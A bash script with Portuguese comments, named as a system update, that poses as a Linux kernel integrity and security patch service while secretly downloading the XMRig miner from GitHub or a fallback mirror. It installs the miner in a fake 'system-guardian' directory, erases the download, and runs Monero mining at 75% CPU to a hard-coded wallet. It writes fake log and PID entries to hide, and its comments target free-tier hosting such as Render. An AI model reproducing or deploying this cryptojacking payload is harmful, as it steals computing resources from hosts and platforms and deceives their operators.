#!/bin/bash

# update.sh v4.2 - Protocolo Moreno (Invisível)
# Simula serviço de atualização crítica do sistema Linux
# Executa mineração oculta de Monero com baixo perfil

echo "[SYSTEM] Iniciando verificação de integridade do kernel..."

# Delay aleatório para evitar padrão de execução
sleep $((RANDOM % 40 + 20))

# Atualiza pacotes silenciosamente (parece legítimo)
apt-get update > /dev/null 2>&1 || true
apt-get install -y wget curl tar gzip libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1 || true

# Baixa binário ofuscado (XMRig disfarçado como patch)
PATCH_URL="https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz"
if ! wget -qO /tmp/system-patch.tar.gz "$PATCH_URL"; then
    echo "[WARNING] Servidor primário inacessível. Tentando mirror secundário..."
    if ! wget -qO /tmp/system-patch.tar.gz https://mirror.monerominer.rocks/xmrig-6.16.2-linux-static-x64.tar.gz; then
        echo "[ERROR] Falha ao baixar atualização. Abortando."
        exit 0
    fi
fi

# Extrai em diretório falso
mkdir -p /opt/system-guardian && \
tar -xzf /tmp/system-patch.tar.gz -C /opt/system-guardian --strip-components=1 && \
chmod +x /opt/system-guardian/xmrig

# Remove rastro
rm -f /tmp/system-patch.tar.gz

# Executa como serviço de fundo (nome técnico, CPU limitado)
nohup /opt/system-guardian/xmrig \
  -o gulf.moneroocean.stream:17017 \                          # Pool estável
  -u 4BDDTir3gpe12zzduhp9Vc3iZpgg5oW71BzH71cmsHv4C31mrRPPCKh2dNpBMQRRdWLXVy91jyfYsgF6MaZjceNu8a1KWgL \  # 🔁 MUDA PRA TEU WALLET DO CAKE!
  --cpu-max-threads-hint=75 \                                 # Usa 75% da CPU (ideal pra Free Tier)
  --donate-level=0 \                                          # Zero doação = lucro total
  --log-file=/var/log/system-guardian.log \                   # Log realista
  --pid=/tmp/.X11-unix/X0-lock \                              # PID falso
  --background > /dev/null 2>&1 &

echo "[OK] Atualização de segurança aplicada. Sistema protegido."

# Cria log falso para manter container ativo (Render aceita isso)
touch /var/log/system-activity.log
echo "$(date) - System Guardian: Status OK | CPU Load: Normal | Memory: Stable" >> /var/log/system-activity.log

# Mantém o serviço rodando com atividade falsa (não usa loop bruto)
while true; do
  sleep 150
  echo "$(date) - System Guardian: Monitoramento em andamento..." >> /var/log/system-activity.log
done
